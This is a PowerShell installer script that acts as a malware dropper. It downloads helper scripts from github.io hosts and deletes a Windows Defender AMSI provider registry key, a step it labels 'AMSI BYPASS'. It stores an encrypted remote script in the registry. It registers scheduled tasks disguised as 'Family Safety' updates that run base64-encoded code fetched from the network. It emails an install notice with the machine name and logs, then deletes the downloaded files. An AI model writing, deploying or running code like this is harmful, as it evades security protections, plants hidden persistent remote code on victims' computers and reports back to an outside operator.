
[CmdletBinding(SupportsShouldProcess)]
param()
$fname=(new-guid).Guid
$fname = $fname.substring(0,20)
$FullLogs = ""
$LogFilePath="$env:Temp\$fname.001"
$EnableLogs=$True
Function OutString{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Msg
    )

    if($EnableLogs -eq $False){
        return
    }
    $FullLogs = $FullLogs + $Msg
    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        
        if ($PSCmdlet.ShouldProcess($Msg)) {
            [pscustomobject]@{
                Time = (Get-Date -f g)
                Message = $Msg
            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
         }
    }else{
        if ($PSCmdlet.ShouldProcess($Msg)) {
            [pscustomobject]@{
                Time = (Get-Date -f g)
                Message = $Msg
            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
         }
    }
}

function New-CTempDirectory
{
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([IO.DirectoryInfo])]
    param(
        [string]
        # A prefix to use, so you can more easily identify *what* created the temporary directory. If you pass in a path, it will be converted to a file name.
        $Prefix
    )

    $tempDir = [IO.Path]::GetRandomFileName()
    if( $Prefix )
    {
        $Prefix = Split-Path -Leaf -Path $Prefix
        $tempDir = '{0}{1}' -f $Prefix,$tempDir
    }

    $tempDir = Join-Path -Path $env:TEMP -ChildPath $tempDir
    New-Item -Path $tempDir -ItemType 'Directory' -Verbose:$VerbosePreference
}

$IncList = [System.Collections.ArrayList]::new()
function Include-Externals {
  [CmdletBinding(SupportsShouldProcess)]
  param()
  try{
      $includes = [System.Collections.ArrayList]::new()
      $null=$includes.Add('Clean-Functions.ps1')
      $null=$includes.Add('Crypto-Functions.ps1')
      $null=$includes.Add('Email-Functions.ps1')
      $null=$includes.Add('Registry-Functions.ps1')
      $null=$includes.Add('Tasks-Functions.ps1')
      $null=$includes.Add('Misc-Functions.ps1')
      $tempdir=New-CTempDirectory -Prefix 'itask'
      $baseurl='https://radicaltronic.github.io/cmd/inc/'
      $webClient = [System.Net.WebClient]::new()
      $basedir=$tempdir.FullName + '\'
      foreach($inc in $includes){
        $source = $baseurl + $inc
        $destination = $basedir + $inc
        Write-Host "Getting $source and savng to $destination"
        
        $webClient.DownloadFile($source, $destination)
        $null=$IncList.Add($destination)
      }
  }
  catch{
    $Msg="Send-InstallNotification Ran into an issue: $($PSItem.ToString())"
    write-error $Msg 
    return
  }

}
Include-Externals
foreach($inc in $IncList){
    . "$inc"
}


$Start=Get-Date
Send-InstallNotification "START Schd Task Install Notice for $env:COMPUTERNAME" "$Start" 

<#         ********************
#              PREPARATION
#          ********************
#>
OutString "----------   INSTALL START   ----------"
OutString "RemoveOldTasks"

RemoveOldTasks 5

# AMSI
OutString "AMSI BYPASS"
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 
$webclient = New-Object Net.WebClient

$NewTaskFolder=$env:COMPUTERNAME + '-MaintenanceUpdate'
OutString "Creating New Scheduled Task Folder: $NewTaskFolder"
New-ScheduledTaskFolder $NewTaskFolder



<#         *******************************************
#              UPDATE TASKS DEFINITION (ENCRYPTED)
#         *******************************************
#>
$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/hourly.ps1.aes'
$EncryptedScript = $webclient.DownloadString($ScriptUrl)
OutString "Getting Script: $ScriptUrl saving TO REGISTRY..."
Set-ScriptDataToRegistry $EncryptedScript


<#         ***********************
#                 TASK NO 1
#         ************************
#>
try{
    $NewTaskName=$NewTaskFolder + '\' + 'FamilySafetyRulesUpdateTask'
    Get-ScheduledTask -TaskName 'FamilySafetyRulesUpdateTask' -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore

    $ScriptUrl='https://radicaltronic.github.io/cmd/run-hourly.ps1'
    $Base64Command=Get-Base64FromUrl $ScriptUrl
    $Base64CommandLen=$Base64Command.Length
    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
    Install-EncodedScriptTask $NewTaskName 15 $Base64Command
}catch
{
    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        Write-Verbose $Msg
    }
    write-error $Msg 
    return    
}   

<#         ***********************
#                 TASK NO 2
#         ************************
#>
try{
    $NewTaskName=$NewTaskFolder + '\' + 'FamilyDailySafetyUpdate1'
    Get-ScheduledTask -TaskName 'FamilyDailySafetyUpdate1' -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
    $ScriptUrl='https://radicaltronic.github.io/cmd/update-runner-scriptblock.ps1'
    $Base64Command=Get-Base64FromUrl $ScriptUrl
    $Base64CommandLen=$Base64Command.Length
    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
    Install-EncodedScriptTask $NewTaskName 500 $Base64Command
}catch
{
    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        Write-Verbose $Msg
    }
    write-error $Msg 
    return 
}  


$End=Get-Date
$Diff=$End-$Start
$Min=$Diff.Minutes
$Sec=$Diff.Seconds
OutString "Done All tasks. Ended on $End."
OutString "Took a total of $Min minutes and $Sec seconds."
$EnableLogs=$false



try{
    $EnableLogs=$false
    
    <#$TempFile=(new-guid).Guid
    $TempFile = $TempFile.substring(0,8) + '.bac'
    $TempFile = Join-Path "$env:TEMP" "$TempFile"
    Copy-Item "$LogFilePath" "$TempFile"
#>
    OutString "Send-InstallNotification"
    Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "Done All tasks. Ended on $End. Took a total of $Min minutes and $Sec seconds. $FullLogs"

    #OutString "Cleanup"
    #Cleanup -DeleteEvents -DeleteLogFiles

    Sleep 1
   # Remove-Item "$TempFile" -Force
}catch
{
    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        Write-Verbose $Msg
    }
    write-error $Msg 
    return 
}  

foreach($inc in $IncList){
    Remove-Item "$inc" -Force -ErrorAction ignore
}
